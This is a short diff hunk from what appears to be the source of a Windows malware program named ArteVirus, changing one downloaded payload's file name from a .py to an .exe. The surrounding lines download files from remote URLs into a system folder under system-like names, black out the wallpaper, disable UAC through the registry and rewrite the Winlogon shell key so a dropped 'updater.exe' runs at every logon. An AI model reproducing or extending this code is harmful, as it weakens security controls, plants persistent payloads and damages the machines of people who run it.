@@ -200,7 +200,7 @@ if ArteVirus.warning():
             f2 = ArteVirus.get_file(r"C:\Windows\Microsoft\Windows\checker.exe", url2)
             f3 = ArteVirus.get_file(r"C:\Windows\Microsoft\Windows\imba.png", url3)
             f4 = ArteVirus.get_file(r"C:\Windows\Microsoft\Windows\error.mp3", url4)
-            f5 = ArteVirus.get_file(r"C:\Windows\Microsoft\Windows\errorHandler.py", url5)
+            f5 = ArteVirus.get_file(r"C:\Windows\Microsoft\Windows\errorHandler.exe", url5)
             ArteVirus.set_black_wallpaper()
             ArteVirus.disable_uac_via_registry()
             ArteVirus.change_shell_key(fr"explorer.exe, {ArteVirus.get_path(r"C:\Windows\Microsoft\Windows")}\updater.exe")
